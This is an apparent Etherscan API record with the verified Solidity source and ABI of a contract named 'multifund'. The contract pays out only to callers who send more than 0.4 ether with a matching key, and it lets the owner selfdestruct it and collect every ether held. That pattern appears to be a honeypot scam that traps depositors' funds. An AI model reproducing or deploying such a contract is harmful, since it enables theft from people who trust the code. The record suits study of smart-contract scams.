{"status": "1", "message": "OK", "result": [{"SourceCode": "pragma solidity ^0.4.25;\r\n\r\ncontract multifund\r\n{\r\n    bytes32 keyHash;\r\n    address owner;\r\n    bytes32 wallet_id = 0x1ad1f2d6f5dcb3beca60ebff0bfab6d04a095299cdb316f6975f52b3c8abb569;\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function withdraw(string key) public payable\r\n    {\r\n        require(msg.sender == tx.origin);\r\n        if(keyHash == keccak256(abi.encodePacked(key))) {\r\n            if(msg.value > 0.4 ether) {\r\n                msg.sender.transfer(address(this).balance);\r\n            }\r\n        }\r\n    }\r\n\r\n    function setup_key(string key) public\r\n    {\r\n        if (keyHash == 0x0) {\r\n            keyHash = keccak256(abi.encodePacked(key));\r\n        }\r\n    }\r\n\r\n    function update_new_hash(bytes32 new_hash) public\r\n    {\r\n        if (keyHash == 0x0) {\r\n            keyHash = new_hash;\r\n        }\r\n    }\r\n\r\n    function clear() public\r\n    {\r\n        require(msg.sender == owner);\r\n        selfdestruct(owner);\r\n    }\r\n\r\n    function get_id() public view returns(bytes32){\r\n        return wallet_id;\r\n    }\r\n\r\n    function () public payable {\r\n    }\r\n}", "ABI": "[{\"constant\":false,\"inputs\":[{\"name\":\"new_hash\",\"type\":\"bytes32\"}],\"name\":\"update_new_hash\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"key\",\"type\":\"string\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"clear\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"key\",\"type\":\"string\"}],\"name\":\"setup_key\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"get_id\",\"outputs\":[{\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]", "ContractName": "multifund", "CompilerVersion": "v0.4.25+commit.59dbf8f1", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://100f9ea20f331a7e7cb03aabfde727de4d342000f8c63c9b69a759e4326c355a"}]}